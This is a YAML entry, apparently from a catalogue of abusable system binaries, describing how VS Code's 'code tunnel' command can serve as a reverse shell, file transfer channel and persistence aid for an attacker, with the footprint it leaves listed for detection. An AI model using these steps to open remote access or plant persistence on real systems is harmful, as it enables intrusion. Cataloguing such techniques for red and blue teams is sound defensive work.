---
name: code
capabilities:
- exec
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: low
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: code tunnel --name xxxxxx
  notes: |-
    This requires a valid GitHub account.

    Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: code tunnel --name xxxxxx
  notes: |-
    This requires a valid GitHub account.

    Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: code tunnel --name xxxxxx
  notes: |-
    This requires a valid GitHub account.

    Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.
references:
- https://gtfobins.github.io/gtfobins/code/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
